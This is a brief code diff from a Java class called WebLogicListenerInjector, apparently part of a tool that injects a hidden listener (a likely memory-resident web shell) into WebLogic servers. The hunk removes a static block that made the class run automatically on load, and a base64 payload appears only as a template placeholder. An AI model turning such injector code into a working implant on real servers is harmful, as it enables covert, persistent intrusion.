@@ -25,10 +25,6 @@ public class WebLogicListenerInjector {
         return "{{base64Str}}";
     }
 
-    static {
-        new WebLogicListenerInjector();
-    }
-
     public WebLogicListenerInjector() {
         try {
             Object[] contexts = getContext();
